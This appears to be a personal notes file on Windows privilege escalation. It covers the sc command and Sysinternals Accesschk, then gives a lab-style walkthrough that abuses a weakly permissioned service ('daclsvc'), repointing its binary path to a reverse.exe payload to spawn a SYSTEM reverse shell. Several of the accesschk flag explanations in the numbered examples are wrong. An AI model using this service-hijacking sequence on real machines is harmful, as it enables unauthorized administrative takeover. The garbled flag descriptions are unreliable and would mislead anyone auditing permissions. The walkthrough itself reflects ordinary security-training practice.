# windows-hacking









________________________


**sc command**

The sc command in Windows is used to 
communicate with the Service Control Manager and services. 
It allows users to query, start, stop, pause, resume, and modify services on the local or a remote computer.

To start a service named "MyService", you can use the following command:
```
sc start MyService
```

_________________________

**Accesschk**


Accesschk is a command-line tool in the Windows Sysinternals suite created by Microsoft that allows users to view the security settings of files, directories, registry keys, and services on a Windows system. It provides a detailed report of the access control lists (ACLs) and permission settings for various objects, helping users to quickly identify any security vulnerabilities or misconfigurations.

Accesschk can be used to audit and troubleshoot permissions on a system, ensuring that only authorized users have access to sensitive resources. It is particularly useful for system administrators and security professionals who need to perform security assessments and ensure compliance with organizational security policies.

Some common use cases for Accesschk include:
- Verifying that a specific user or group has the necessary permissions to access a certain file or directory
- Checking the permissions of a service to determine if it is properly configured
- Identifying potential security risks by discovering overly permissive access controls
- Troubleshooting access issues by comparing the expected permissions with the actual permissions set on an object

Accesschk is a powerful tool that can help improve the security posture of a Windows system by providing valuable insights into its security settings. However, it should be used with caution, as making changes to permissions without understanding the consequences can potentially lead to system instability or security breaches.


______________________

1. accesschk -w Users C:\Program Files\ExampleApp
This command checks the access control permissions for the "Users" group on the ExampleApp folder located at C:\Program Files. It will show the specific permissions that the Users group has on that folder.

2. accesschk -s -q -c HKLM\SOFTWARE
This command checks the security permissions for the HKLM\SOFTWARE registry key. The -s flag specifies that it should recurse into all subkeys, the -q flag suppresses the banner and column headers, and the -c flag specifies that only the key security settings should be displayed.

3. accesschk -uwc "Authenticated Users" C:\Windows\System32
This command checks the specific permissions for the "Authenticated Users" group on the System32 folder in the Windows directory. The -u flag specifies that it should only display specific user or group permissions, and the -w flag specifies displaying the effective access for each object.

4. accesschk -q -o *.dll C:\Windows
This command checks the security permissions for all DLL files in the Windows directory. The -q flag suppresses the banner and column headers, and the -o flag specifies that only objects matching the search pattern should be displayed.

5. accesschk -q -f -s -u Everyone C:\
This command checks the security permissions for all files and folders on the C:\ drive for the "Everyone" group. The -f flag specifies that it should also check file permissions, the -s flag specifies that it should recurse into subdirectories, and the -u flag forces it to display the user/group name for each object.


_______________


**How to get Autority**



Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:

```
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
```
Note that the "user" account has the permission to change the service config (SERVICE_CHANGE_CONFIG).

Query the service and note that it runs with SYSTEM privileges (SERVICE_START_NAME):

```
sc qc daclsvc
```

Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:

```
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
```

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

```
net start daclsvc
```




